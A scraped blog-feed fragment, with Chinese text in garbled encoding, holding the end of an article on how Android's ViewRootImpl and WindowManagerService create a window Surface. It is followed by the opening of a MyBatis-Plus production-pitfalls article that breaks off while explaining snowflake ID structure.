<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">requestLayout</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">if</span> (!mHandlingLayoutInLayoutRequest) {
        ...
        scheduleTraversals();
    }
}
<span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">performTraversals</span><span class="hljs-params">()</span> {
    ...
    relayoutResult = relayoutWindow(params, viewVisibility, insetsPending);
    ...
}
<span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-title function_">relayoutWindow</span><span class="hljs-params">(WindowManager.LayoutParams params, <span class="hljs-type">int</span> viewVisibility,
        <span class="hljs-type">boolean</span> insetsPending)</span> <span class="hljs-keyword">throws</span> RemoteException {
    ...
    <span class="hljs-type">int</span> <span class="hljs-variable">relayoutResult</span> <span class="hljs-operator">=</span> mWindowSession.relayout(mWindow, mSeq, params,
            (<span class="hljs-type">int</span>) (mView.getMeasuredWidth() * appScale + <span class="hljs-number">0.5f</span>),
            (<span class="hljs-type">int</span>) (mView.getMeasuredHeight() * appScale + <span class="hljs-number">0.5f</span>), viewVisibility,
            insetsPending ? WindowManagerGlobal.RELAYOUT_INSETS_PENDING : <span class="hljs-number">0</span>, frameNumber,
            mWinFrame, mPendingOverscanInsets, mPendingContentInsets, mPendingVisibleInsets,
            mPendingStableInsets, mPendingOutsets, mPendingBackDropFrame, mPendingDisplayCutout,
            mPendingMergedConfiguration, mSurface);
    ...
    <span class="hljs-keyword">return</span> relayoutResult;
}
</code></pre>
<p><code>relayoutWindow()</code>é€šè¿‡<code>Session</code>çš„<code>relayout()</code>æ–¹æ³•è°ƒç”¨åˆ°<code>WMS</code>çš„<code>relayoutWindow()</code>æ–¹æ³•</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">relayout</span><span class="hljs-params">(IWindow window, <span class="hljs-type">int</span> seq, ...)</span> {
        ...
        <span class="hljs-type">int</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> mService.relayoutWindow(<span class="hljs-built_in">this</span>, window, seq, attrs,
                requestedWidth, requestedHeight, viewFlags, flags, frameNumber,
                outFrame, outOverscanInsets, outContentInsets, outVisibleInsets,
                outStableInsets, outsets, outBackdropFrame, cutout,
                mergedConfiguration, outSurface);
        ...
        <span class="hljs-keyword">return</span> res;
    }
</code></pre>
<p><code>WMS</code>ä¸­çš„<code>relayoutWindow()</code>ä»£ç æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬ç®€å•çœ‹ä¸‹ï¼š</p>
<pre><code class="hljs language-java" lang="java">    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">relayoutWindow</span><span class="hljs-params">(...)</span> {
        ...
        <span class="hljs-keyword">synchronized</span>(mWindowMap) {
            <span class="hljs-comment">// ä» mWindowMap å–å‡ºå¯¹åº”çš„ WindowState å¯¹è±¡</span>
            <span class="hljs-type">WindowState</span> <span class="hljs-variable">win</span> <span class="hljs-operator">=</span> windowForClientLocked(session, client, <span class="hljs-literal">false</span>);
            <span class="hljs-keyword">if</span> (win == <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
            }
            displayId = win.getDisplayId();
            ...
            <span class="hljs-comment">// è°ƒç”¨ WindowSurfacePlacer çš„ performSurfacePlacement æ–¹æ³•</span>
            <span class="hljs-comment">// è¿™ä¸ªæ–¹æ³•å…¶å®å°±æ˜¯æ£€æŸ¥æ¸…ç†æ— ç”¨çš„ Surface å¯¹è±¡ï¼Œä¸ºåé¢åˆ›å»º Surface åšå‡†å¤‡</span>
            <span class="hljs-comment">// è¯¦ç»†çš„æ–¹æ³•å°±ä¸è´´å‡ºæ¥äº†ï¼Œå¤§å®¶å¯ä»¥è‡ªè¡Œé˜…è¯»</span>
            mWindowPlacerLocked.performSurfacePlacement(<span class="hljs-literal">true</span> <span class="hljs-comment">/* force */</span>);
            <span class="hljs-keyword">if</span> (shouldRelayout) {
                result = win.relayoutVisibleWindow(result, attrChanges, oldVisibility);
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-comment">// åˆ›å»º Surface ï¼Œç¡®åˆ‡çš„è¯´åº”è¯¥æ˜¯åˆ›å»º WindowSurfaceController å¯¹è±¡</span>
                    <span class="hljs-comment">// WindowSurfaceController å…¶å®å°±æ˜¯å¯¹ Surface å’Œ SurfaceControl çš„å°è£…</span>
                    <span class="hljs-comment">// Surface å’Œ SurfaceControl çš„å…³ç³»åœ¨åäºŒç« å·²ç»ä»‹ç»å•¦</span>
                    result = createSurfaceControl(outSurface, result, win, winAnimator);
                } 
                ...
            } <span class="hljs-keyword">else</span> {
                ...
            }
            <span class="hljs-keyword">if</span> (focusMayChange) {
                <span class="hljs-comment">// å¦‚æœçª—å£å‘ç”Ÿäº†å˜åŒ–ï¼Œè°ƒç”¨ updateFocusedWindowLocked æ–¹æ³•é‡æ–°æµ‹é‡çª—å£å¤§å°</span>
                <span class="hljs-comment">// è¿™ä¸ªæ–¹æ³•æ‰æ˜¯çœŸæ­£çš„æ ¸å¿ƒæµ‹é‡çª—å£å¤§å°é€»è¾‘</span>
                <span class="hljs-comment">// æ–¹æ³•ä¸­ä¼šè°ƒç”¨ DisplayContent.performLayout æ–¹æ³•å¼€å§‹çœŸæ­£çš„æµ‹é‡</span>
                <span class="hljs-keyword">if</span> (updateFocusedWindowLocked(UPDATE_FOCUS_WILL_PLACE_SURFACES,
                        <span class="hljs-literal">false</span> <span class="hljs-comment">/*updateInputWindows*/</span>)) {
                    imMayMove = <span class="hljs-literal">false</span>;
                }
            }
            ...
            win.mInRelayout = <span class="hljs-literal">false</span>;
        }
        ...
    }
</code></pre>
<p>åœ¨ <code>WMS</code> çš„ <code>relayoutWindow()</code> æ–¹æ³•ä¸­ï¼Œæ ¸å¿ƒé€»è¾‘åœ¨äº <code>createSurfaceControl</code> çš„è°ƒç”¨ã€‚</p>
<pre><code class="hljs language-java" lang="java">result = createSurfaceControl(outSurface, result, win, winAnimator);
</code></pre>
<p>è¿™é‡Œçš„å‚æ•° outSurface è‡³å…³é‡è¦ã€‚å›çœ‹ ViewRootImpl è°ƒç”¨ relayout çš„ä»£ç ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ViewRootImpl.java</span>
mWindowSession.relayout(..., mSurface);
</code></pre>
<p>æˆ‘ä»¬å¯ä»¥æ˜ç¡®çœ‹åˆ°ï¼Œ<code>ViewRootImpl</code> å°†è‡ªå·±çš„æˆå‘˜å˜é‡ mSurface ä¼ é€’ç»™äº† <code>WMS</code>ã€‚ åœ¨ <code>WMS</code> å†…éƒ¨ï¼Œ<code>createSurfaceControl</code> ä¼šè¯·æ±‚ <code>SurfaceFlinger</code> åˆ›å»ºå›¾å±‚ï¼ˆ<code>Layer</code>ï¼‰ï¼Œå¹¶å°†ç”Ÿæˆçš„ <code>Native</code> å±‚ <code>Surface</code> ä¿¡æ¯å›å†™ï¼ˆ<code>Copy</code>ï¼‰åˆ°ä¼ å…¥çš„ <code>outSurface</code> å‚æ•°ä¸­ã€‚</p>
<p>è¿™æ„å‘³ç€ï¼š å½“ <code>relayoutWindow</code> è°ƒç”¨è¿”å›æ—¶ï¼Œåº”ç”¨è¿›ç¨‹ <code>ViewRootImpl</code> ä¸­çš„ <code>mSurface</code> å¯¹è±¡å°±å·²ç»æŒæœ‰äº†çœŸæ­£çš„å›¾å½¢ç¼“å†²åŒºå¼•ç”¨ï¼Œéšååº”ç”¨ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸ª <code>Surface</code> è¿›è¡Œç»˜å›¾ã€‚</p>
<blockquote>
<p>æ€ä¹ˆè¯´ï½æ€ä¹ˆè¯´ï½ã€‚å‰è¨€çš„é—®é¢˜æ˜¯ä¸æ˜¯æ˜äº†å•¦</p>
</blockquote>
<h2 data-id="heading-18">æ€»ç»“</h2>
<p>Android çš„çª—å£ç³»ç»Ÿæ˜¯ä¸€ä¸ªå…¸å‹çš„ <code>C/S</code> æ¶æ„ï¼Œç”±åº”ç”¨è¿›ç¨‹ï¼ˆClientï¼‰å’Œ <code>WindowManagerService</code>ï¼ˆServerï¼‰å…±åŒæ„æˆï¼š</p>
<p><strong>åº”ç”¨ç«¯ (Client)</strong></p>
<ul>
<li>
<p><code>Activity</code> è´Ÿè´£ç”Ÿå‘½å‘¨æœŸï¼ŒæŒæœ‰ä¸€ä¸ª <code>PhoneWindow</code> å¯¹è±¡æ¥ç®¡ç†è§†å›¾ç­–ç•¥ã€‚</p>
</li>
<li>
<p><code>DecorView</code> æ˜¯è§†å›¾æ ‘çš„æ ¹èŠ‚ç‚¹ã€‚</p>
</li>
<li>
<p><code>ViewRootImpl</code> æ˜¯æ ¸å¿ƒç®¡ç†è€…ï¼Œå®ƒè¿æ¥äº† DecorView å’Œ <code>WMS</code>ï¼Œå¹¶æŒæœ‰ <code>Surface</code> å¯¹è±¡ï¼Œè´Ÿè´£å‘èµ·ç»˜åˆ¶æµç¨‹ï¼ˆMeasure/Layout/Drawï¼‰ã€‚</p>
</li>
<li>
<p><code>WindowManagerGlobal</code> æ˜¯è¿›ç¨‹å•ä¾‹ï¼Œè´Ÿè´£ç®¡ç†å½“å‰è¿›ç¨‹æ‰€æœ‰çš„ <code>ViewRootImpl</code> å’Œ <code>View</code>ã€‚</p>
</li>
</ul>
<p><strong>é€šä¿¡å±‚ (IPC)</strong></p>
<ul>
<li>
<p><code>IWindowSession</code>ï¼šåº”ç”¨å‘ <code>WMS</code> å‘é€è¯·æ±‚çš„é€šé“ï¼ˆå¦‚ <code>addToDisplay</code>, <code>relayout</code>ï¼‰ã€‚</p>
</li>
<li>
<p><code>IWindow</code> (<code>W</code>ç±»)ï¼š<code>WMS</code> å›è°ƒåº”ç”¨çš„é€šé“ï¼ˆå¦‚çª—å£ç„¦ç‚¹å˜åŒ–ã€é…ç½®æ”¹å˜ï¼‰ã€‚</p>
</li>
</ul>
<p><strong>æœåŠ¡ç«¯ (WMS)</strong></p>
<ul>
<li>
<p><code>WindowState</code>ï¼š<code>WMS</code> ä¸­ä»£è¡¨ä¸€ä¸ªçª—å£çš„å®ä½“ï¼Œä¿å­˜çª—å£çš„æ‰€æœ‰å±æ€§ã€‚</p>
</li>
<li>
<p><code>WindowContainer</code>ï¼šæ„å»ºäº†å±‚çº§åŒ–çš„çª—å£å®¹å™¨ç»“æ„ï¼ˆ<code>DisplayContent</code> -&gt; <code>TaskStack</code> -&gt; <code>WindowState</code>ï¼‰ã€‚</p>
</li>
<li>
<p><code>Surface</code> ç®¡ç†ï¼š<code>WMS</code> åœ¨ <code>relayoutWindow</code> è¿‡ç¨‹ä¸­è®¡ç®—çª—å£å¤§å°ä¸ä½ç½®ï¼Œå¹¶ä¸ <code>SurfaceFlinger</code> é€šä¿¡åˆ›å»º <code>SurfaceControl</code>ï¼Œæœ€ç»ˆå°†å¯ç”¨çš„ <code>Surface</code> è¿”å›ç»™åº”ç”¨ç«¯ã€‚</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MyBatis-Plusè¸©å‘è¡€æ³ªå²ï¼šé‚£äº›å¹´æˆ‘ä»¬è¸©è¿‡çš„å‘ï¼]]></title>    <link>https://juejin.cn/post/7576018857368485931</link>    <guid>https://juejin.cn/post/7576018857368485931</guid>    <pubDate>2025-11-24T10:33:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576018857368485931" data-draft-id="7576026767372058643" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MyBatis-Plusè¸©å‘è¡€æ³ªå²ï¼šé‚£äº›å¹´æˆ‘ä»¬è¸©è¿‡çš„å‘ï¼"/> <meta itemprop="keywords" content="MyBatis,Java,é¢è¯•"/> <meta itemprop="datePublished" content="2025-11-24T10:33:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ"/> <meta itemprop="url" content="https://juejin.cn/user/606586148237431"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MyBatis-Plusè¸©å‘è¡€æ³ªå²ï¼šé‚£äº›å¹´æˆ‘ä»¬è¸©è¿‡çš„å‘ï¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/606586148237431/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T10:33:57.000Z" title="Mon Nov 24 2025 10:33:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»15åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>å‰è¨€</strong>ï¼šæˆ‘ä»¬åœ¨ç”Ÿäº§ç¯å¢ƒé‡Œè·‘MyBatis-Pluså¾ˆå¤šå¹´ï¼Œå‡ ä¹æŠŠèƒ½è¸©çš„å‘éƒ½è¸©è¿‡äº†ã€‚æ¯æ¬¡å‡ºäº‹æ•…ï¼Œéƒ½èƒ½è¿½æº¯åˆ°æˆ‘ä»¬å½“åˆä»¥ä¸ºâ€œæ¡†æ¶ä¼šå¸®å¿™æå®šâ€çš„æŸä¸ªç»†èŠ‚ã€‚äºæ˜¯æˆ‘ä»¬æŠŠè¿™äº›çœŸå®ç»å†å†™ä¸‹æ¥ï¼Œç”¨æ›´æ¥åœ°æ°”çš„æ–¹å¼èŠèŠæ ¹å› å’Œè§£æ³•ï¼Œå¸®ä½ å°‘ç†¬å‡ æ¬¡å¤œã€‚</p>
</blockquote>
<h2 data-id="heading-0">1ã€æ—¶ä»£èƒŒæ™¯ä¸ORMé€‰æ‹©</h2>
<h3 data-id="heading-1">1.1 äº’è”ç½‘æ—¶ä»£çš„æ•°æ®æŒ‘æˆ˜</h3>
<p>ä¸šåŠ¡é‡æš´æ¶¨ï¼Œæ•°æ®ä¹Ÿè·Ÿç€ç‹‚é£™ã€‚ç™¾ä¸‡çº§æ•°æ®åœ¨å‡ å¹´å‰è¿˜ç®—å¤§ï¼Œå¦‚ä»ŠåŠ¨ä¸åŠ¨å°±ä¸Šäº¿ã€‚ä¸æ­¤åŒæ—¶ï¼Œå¾®æœåŠ¡æ‹†åˆ†å¾—è¶Šæ¥è¶Šç»†ï¼Œæ•°æ®è®¿é—®å±‚å˜å¾—åˆåšåˆå¤æ‚ã€‚å¤§å®¶ä¸€è¾¹è¦è¿½æ–°éœ€æ±‚ï¼Œä¸€è¾¹åˆè¦å…¼é¡¾æ€§èƒ½ç¨³å®šã€‚æ²¡æœ‰è¶æ‰‹çš„å¼€å‘å·¥å…·ï¼Œæ ¹æœ¬é¡¶ä¸ä½èŠ‚å¥ã€‚</p>
<h3 data-id="heading-2">1.2 MyBatis-Plusçš„è¯ç”Ÿä¸å®šä½</h3>
<p>äºæ˜¯ï¼ŒJavaå›¢é˜Ÿå¼€å§‹åœ¨ORMä¸–ç•Œé‡Œä¸æ–­æ‰¾å¹³è¡¡ã€‚Hibernateå¤ªé‡ï¼ŒåŸç”ŸMyBatisåˆå¤ªå¤šæ‰‹å·¥æ´»ã€‚MyBatis-Plusæ­£æ˜¯åœ¨è¿™ç§â€œåˆæƒ³å¿«åˆæƒ³ç¨³â€çš„è¯‰æ±‚ä¸‹å‡ºç°çš„ã€‚å®ƒä¸æ˜¯ç®€å•çš„â€œè¯­æ³•ç³–â€ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>ä¸ºäº†ç”Ÿäº§ç¯å¢ƒè€Œç”Ÿçš„å¢å¼ºæ¡†æ¶</strong>ã€‚</p>
<p><strong>MyBatis-Plusçš„æ ¸å¿ƒä»·å€¼</strong>ï¼š</p>
<ul>
<li><strong>ç®€åŒ–å¼€å‘</strong>ï¼šCRUDéƒ½æœ‰å°è£…ï¼Œå°‘å†™å¾ˆå¤šSQLï¼Œæ‰‹æ›´è½»</li>
<li><strong>åŠŸèƒ½å¢å¼º</strong>ï¼šé€»è¾‘åˆ é™¤ã€è‡ªåŠ¨å¡«å……ã€ä¹è§‚é”ã€å¤šç§Ÿæˆ·ã€ä»£ç ç”Ÿæˆå™¨ç­‰éƒ½ç°æˆ</li>
<li><strong>æ€§èƒ½ä¼˜åŒ–</strong>ï¼šå†…ç½®åˆ†é¡µã€æ€§èƒ½åˆ†æã€æ‰¹é‡ä¼˜åŒ–ã€ç¼“å­˜æ’ä»¶ï¼Œè·‘å¾—æ›´å¿«</li>
<li><strong>æ— ç¼é›†æˆ</strong>ï¼šå…¼å®¹MyBatisï¼Œè€é¡¹ç›®ä¹Ÿèƒ½æ…¢æ…¢æ›¿æ¢ï¼Œå‡ ä¹ä¸ç”¨é‡æ„</li>
</ul>
<p>è¿™äº›å–ç‚¹è®©MyBatis-Plusè¿…é€Ÿèµ°çº¢ã€‚ä¸è¿‡ï¼ŒåŠŸèƒ½å¤šå¹¶ä¸ç­‰äºå¥½ç”¨ã€‚ç‰¹åˆ«æ˜¯åˆ°äº†ç”Ÿäº§ç¯å¢ƒï¼Œéšè—çš„å‘ä¸€ä¸ªæ¥ä¸€ä¸ªã€‚</p>
<hr/>
<h2 data-id="heading-3">2ã€ç”Ÿäº§ç¯å¢ƒæŒ‘æˆ˜</h2>
<p>å¼€å‘ç¯å¢ƒé‡Œä¸€åˆ‡éƒ½å¾ˆé¡ºã€‚<code>saveBatch()</code>è½»æ¾æå®šæ‰¹é‡æ’å…¥ï¼Œ<code>@TableId(type = IdType.ASSIGN_ID)</code>ä¸€å†™å°±æœ‰åˆ†å¸ƒå¼IDï¼Œçœ‹èµ·æ¥ç¨³å¾—å¾ˆã€‚</p>
<p>ç„¶è€Œï¼ŒçœŸæ­£éƒ¨ç½²ä¸Šçº¿åé—®é¢˜æ‰æš´éœ²å‡ºæ¥ã€‚</p>
<p><strong>å‡Œæ™¨3ç‚¹çš„å‘Šè­¦</strong>ï¼šä¸»é”®å†²çªï¼Œè®¢å•ç³»ç»Ÿåœæ‘†ã€‚æˆ‘ä»¬å‘ç°ä¸¤ä¸ªå®¹å™¨å®ä¾‹ç”Ÿæˆäº†åŒä¸€ä¸ªé›ªèŠ±IDã€‚ç†è®ºä¸Šâ€œä¸å¯èƒ½å‘ç”Ÿâ€çš„äº‹ï¼Œå°±è¿™ä¹ˆå‘ç”Ÿäº†ã€‚</p>
<p>å†å¾€ä¸‹æ’æŸ¥ï¼Œæ‰¹é‡æ“ä½œä¹±åºã€æšä¸¾å­—æ®µå†™å…¥å¼‚å¸¸ã€è‡ªåŠ¨å¡«å……å¤±çµâ€¦â€¦é—®é¢˜ä¸€ä¸ªæ¯”ä¸€ä¸ªç¦»è°±ã€‚</p>
<p>è¿™äº›äº‹æ•…æœ‰ä¸ªå…±åŒç‚¹ï¼šå¼€å‘ç¯å¢ƒä¸€åˆ‡æ­£å¸¸ï¼Œç”Ÿäº§ç¯å¢ƒå´å´©æˆä¸€ç‰‡ã€‚æ ¹æœ¬åŸå› æ˜¯å•æœºå’Œåˆ†å¸ƒå¼ã€ä½å¹¶å‘å’Œé«˜å¹¶å‘ä¹‹é—´çš„å·®å¼‚ï¼Œè¢«æ¡†æ¶é»˜è®¤é…ç½®æ— é™æ”¾å¤§ï¼Œç»“æœå°±æ˜¯â€œçœ‹ç€æ²¡äº‹â€çš„ä»£ç åœ¨ç”Ÿäº§é‡Œé¢‘é¢‘æ‰é“¾å­ã€‚</p>
<p>æˆ‘ä»¬å› æ­¤æ•´ç†å‡ºMyBatis-Plusåœ¨ç”Ÿäº§ç¯å¢ƒæœ€å®¹æ˜“æš´é›·çš„6å¤§é™·é˜±ï¼š</p>
<ol>
<li><strong>é›ªèŠ±ç®—æ³•IDç”Ÿæˆé‡å¤é—®é¢˜</strong></li>
<li><strong>æ‰¹é‡æ’å…¥ä¹±åºé—®é¢˜</strong></li>
<li><strong>æšä¸¾å­—æ®µå­˜å‚¨é£é™©</strong></li>
<li><strong>é©¼å³°è½¬æ¢é”™ä½</strong></li>
<li><strong>æ‰¹é‡æ“ä½œæ—¶è‡ªåŠ¨å¡«å……å¤±æ•ˆ</strong></li>
<li><strong>å†™å…¥æ—¶JSONæ•°æ®ä¸¢å¤±æˆ–æ ¼å¼å¼‚å¸¸</strong></li>
</ol>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬æŠŠè¿™äº›é—®é¢˜é€ä¸€æ‹†å¼€ï¼ŒèŠèŠèƒŒåçš„é€»è¾‘ï¼Œå†ç»™å‡ºå®æµ‹å¯è¡Œçš„è§£æ³•ã€‚</p>
<hr/>
<h2 data-id="heading-4">é›ªèŠ±ç®—æ³•IDç”Ÿæˆé‡å¤é—®é¢˜</h2>
<h3 data-id="heading-5">3.1 é—®é¢˜ç°è±¡</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çœ‹èµ·æ¥å¾ˆæ­£å¸¸çš„ä»£ç </span>
<span class="hljs-meta">@TableId(value = "id", type = IdType.ASSIGN_ID)</span>
<span class="hljs-keyword">private</span> Long id;

<span class="hljs-comment">// ä½†åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å´å‡ºç°äº†è¿™æ ·çš„é”™è¯¯ï¼š</span>
<span class="hljs-comment">// Duplicate entry '1234567890123456789' for key 'PRIMARY'</span>
</code></pre>
<p><strong>â€œIDæ€ä¹ˆè¿˜èƒ½æ’ï¼Ÿâ€</strong> è¿™æ˜¯æˆ‘ä»¬ç¬¬ä¸€æ¬¡é‡åˆ°æ—¶çš„çœŸå®ååº”ã€‚</p>
<h3 data-id="heading-6">3.2 é›ªèŠ±ç®—æ³•èº«ä»½è¯ç»“æ„</h3>
<p>å…ˆææ¸…æ¥šé›ªèŠ±IDé‡Œé¢è£…äº†ä»€ä¹ˆï¼Œå†è°ˆå¦‚ä½•é˜²é‡å¤ã€‚å¯ä»¥æŠŠå®ƒæƒ³æˆä¸€ä¸ª<strong>è¶…é•¿èº«ä»½è¯å·</strong>ï¼š</p>
<pre><code class="hljs language-scss" lang="scss">èº«ä»½è¯å·ç ï¼š<span class="hljs-number">1234567890123456789</span>
åˆ†è§£ç»“æ„ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  æ—¶é—´æˆ³  â”‚ æ•°æ®ä¸­å¿ƒ â”‚ æœºå™¨ç¼–å· â”‚ åºåˆ—å·  â”‚
â”‚ (<span class="hljs-number">41</span>ä½)  â”‚ (<span class="hljs-number">5</span>ä½)   â”‚ (<span class="hljs-number">5</span>ä½)   â”‚ (<span class="hljs-number">12</span>ä½)  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<ul>
<li><strong>æ—¶é—´æˆ³</strong>åƒå‡ºç”Ÿå¹´æœˆæ—¥</li>
<li><strong>æ•°æ®ä¸­å¿ƒID</strong>ç±»ä¼¼çœä»½</li>
<li><strong>æœºå™¨ID</strong>å¯¹åº”åŸå¸‚</li>
<li><strong>åºåˆ—å·</strong>å°±æ˜¯åŒä¸€æ¯«ç§’çš„æ’é˜Ÿå·</li>
</ul>
